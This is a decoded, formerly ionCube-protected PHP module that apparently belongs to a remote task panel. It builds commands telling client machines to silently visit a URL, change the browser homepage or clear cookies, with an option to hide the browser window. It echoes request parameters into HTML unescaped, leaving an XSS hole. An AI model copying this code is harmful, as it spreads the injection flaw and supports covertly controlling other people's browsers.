<?php
/*
 * @ https://EasyToYou.eu - IonCube v10 Decoder Online
 * @ PHP 5.6
 * @ Decoder version: 1.0.4
 * @ Release: 02/06/2020
 *
 * @ ZendGuard Decoder PHP 5.6
 */

echo "\t\t\t\t";
if (!defined("IN_TASKS_MODULE")) {
    exit("..");
}
$e_is_url_required = (bool) ($_GET["s"] == "visit" || $_GET["s"] == "homepage") ? true : false;
if (!isset($_TASK_FILE_UI_ONLY)) {
    define("TASKS_BROWSE_ERROR_LINK_REQUIRED", "A valid URL is required.");
    define("TASKS_BROWSE_ERROR_LINK_INVALID", "The URL you provided is invalid.");
    define("TASKS_BROWSE_ERROR_SUBMIT_FAILURE", "The task information provided was invalid. Unable to create task.");
    if ($e_is_url_required == true && (!isset($_POST["cmd_browser_url"]) || strlen($_POST["cmd_browser_url"]) == 0)) {
        $_TASK_FILE_UI_FIELD_ERRORS["field_1"] = TASKS_FIX_VALUE_BACKGROUND_COLOR_STYLE_CODE;
        _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, TASKS_BROWSE_ERROR_LINK_REQUIRED, true, MOD_TASKS_ALERT_WIDTH);
    } else {
        $_TASK_COMMAND_FIELDS = array("url" => "", "options" => 0);
        $_TASK_COMMAND_FIELDS["url"] = isset($_POST["cmd_browser_url"]) ? $_POST["cmd_browser_url"] : "";
        $e_cmd_switches = COMMAND_GENERAL_SWITCH_SILENT;
        $e_browser_cmd = "";
        $e_browser_format = COMMAND_FORMAT_BROWSER;
        if (isset($_POST["cmd_visit_hide_window"])) {
            $e_cmd_switches .= COMMAND_BROWSER_VISIT_SWITCH_HIDE_WINDOW;
        }
        if ($_GET["s"] == "visit") {
            $_TASK_FILE_SQL_TASK_TYPE = TASK_TYPE_BROWSER_VISIT;
            $e_browser_cmd = COMMAND_STRING_BROWSER_VISIT;
        } else {
            if ($_GET["s"] == "homepage") {
                $_TASK_FILE_SQL_TASK_TYPE = TASK_TYPE_BROWSER_HOMEPAGE;
                $e_browser_cmd = COMMAND_STRING_BROWSER_HOMEPAGE;
            } else {
                if ($_GET["s"] == "clearcache") {
                    $_TASK_FILE_SQL_TASK_TYPE = TASK_TYPE_BROWSER_CLEARCACHE;
                    $e_browser_cmd = COMMAND_STRING_BROWSER_CLEARCACHE;
                    $e_browser_format = COMMAND_FORMAT_BROWSER2;
                    $e_cmd_switches = COMMAND_BROWSER_SWITCH_CLEARCACHE;
                }
            }
        }
        if (0 < strlen($e_browser_cmd)) {
            $_TASK_COMMAND_STRING = sprintf($e_browser_format, $e_browser_cmd, $e_cmd_switches, $_TASK_COMMAND_FIELDS["url"]);
        } else {
            _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, TASKS_BROWSE_ERROR_SUBMIT_FAILURE, true, MOD_TASKS_ALERT_WIDTH);
        }
    }
} else {
    if (isset($_GET["s"])) {
        $cmd_exoption_header = "";
        if ($_GET["s"] == "visit") {
            $cmd_extoption_header = "Visit URL options";
        } else {
            if ($_GET["s"] == "homepage") {
                $cmd_extoption_header = "Set browser homepage options";
            } else {
                if ($_GET["s"] == "clearcache") {
                    $cmd_extoption_header = "Clear cookies";
                }
            }
        }
        if (0 < strlen($cmd_extoption_header)) {
            if (0 < strlen($e_task_cmd_string)) {
                global $e_is_url_required;
                $task_browser_splits = @explode(" ", $e_task_cmd_string);
                $task_browser_edit__switches = $task_browser_splits[1];
                $task_browser_edit__url = $e_is_url_required == true ? $task_browser_splits[2] : "";
            } else {
                $task_browser_edit__url = isset($_POST["cmd_browser_url"]) ? $_POST["cmd_browser_url"] : "";
            }
            echo "\n\t\t\t\t";
            _obfuscated_0D3C1605063C03152930040422062C0F0121150D5C0832_((string) $cmd_extoption_header, 17, "top: 0px; font-size: 10px; face: font-family: Tahoma;", "left: 2px");
            echo "\t\t\t\t<br />\n\t\t\t\t<input type=\"hidden\" name=\"cmd_command\" value=\"";
            echo $_GET["s"];
            echo "\">\n\t\t\t  ";
            global $e_is_url_required;
            if ($e_is_url_required == true) {
                echo "\t\t\t\t<table>\n\t\t\t\t\t<tbody>\n\t\t\t\t\t\t<tr>\n\t\t\t\t\t\t\t<td style=\"border: 0; padding-top: 1px; padding-left: 1px; padding-right: 1px; padding-bottom: 1px;\">\n\t\t\t\t\t\t\t\t<span style=\"font-size: 11px; face: font-family: Tahoma; position: relative; top: -5px;\">URL: &nbsp;&nbsp;&nbsp;</span>\n\t\t\t\t\t\t\t</td>\n\t\t\t\t\t\t\t<td style=\"border: 0; padding-top: 1px; padding-left: 1px; padding-right: 1px; padding-bottom: 1px;\">\n\t\t\t\t\t\t\t\t<input type=\"text\" class=\"span3\" name=\"cmd_browser_url\" value=\"";
                echo $task_browser_edit__url;
                echo "\" style=\"position: relative; top: -1px; width: 480px; height: 10px; font-size: 10px; face: font-family: Tahoma; ";
                echo $_TASK_FILE_UI_FIELD_ERRORS["field_1"];
                echo "\">\n\t\t\t\t\t\t\t</td>\n\t\t\t\t\t\t</tr>\n\t\t\t\t\t</tbody>\n\t\t\t\t</table>\n\t\t\t\n\t\t\t  ";
            } else {
                echo "<span style=\"font-size: 11px; face: font-family: Tahoma\"><i>No extended options</i></span><br />";
            }
            if ($_GET["s"] == "visit") {
                if (isset($task_browser_edit__switches) && strlen($task_browser_edit__switches)) {
                    $ppt_task_option_hide_window = strstr($task_browser_edit__switches, COMMAND_BROWSER_VISIT_SWITCH_HIDE_WINDOW) ? "checked" : "";
                } else {
                    $ppt_task_option_hide_window = isset($_POST["cmd_visit_hide_window"]) ? "checked" : "";
                }
                echo "\t\t\t  <label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma\">\n                <input type=\"checkbox\" id=\"optionsCheckbox\" name=\"cmd_visit_hide_window\" value=\"yes\" style=\"position: relative; top: -1px\" ";
                echo $ppt_task_option_hide_window;
                echo ">\n                Hide browser window\n              </label>\n\t\t\t\t\n\t\t\t\t";
            }
        }
    }
}

?>